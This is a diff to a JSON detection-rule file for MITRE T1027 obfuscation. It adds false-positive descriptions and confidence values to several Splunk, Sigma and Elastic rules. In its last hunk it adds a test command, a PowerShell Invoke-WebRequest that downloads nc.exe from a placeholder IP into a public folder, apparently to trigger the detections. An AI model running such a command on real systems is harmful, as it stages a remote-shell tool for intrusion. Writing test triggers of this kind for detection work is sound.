@@ -98,7 +98,8 @@
           "T1027"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management"
       },
       {
         "platform": "splunk",
@@ -112,7 +113,8 @@
         "confidence": "medium",
         "log_ids": [
           "1"
-        ]
+        ],
+        "false_positives": "Backup software, AV scans, or IT deployment tools creating similar files"
       },
       {
         "platform": "splunk",
@@ -123,7 +125,8 @@
           "T1027"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management"
       },
       {
         "platform": "sigma",
@@ -134,7 +137,8 @@
           "T1027"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate system tools performing similar operations (e.g. admin scripts, management agents)"
       },
       {
         "platform": "elastic",
@@ -144,7 +148,9 @@
         "attack": [
           "T1027"
         ],
-        "fidelity": "behavioral"
+        "fidelity": "behavioral",
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management",
+        "confidence": "high"
       }
     ],
     "visibility": {
@@ -175,7 +181,8 @@
         "Review PowerShell Script Block / Module Logs, Sysmon for surrounding context (5 min before/after)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "Invoke-WebRequest http://<ip>/nc.exe -UserAgent $UserAgent -OutFile \"C:\\Users\\Public\\nc.exe\""
     }
   },
   "variations": [
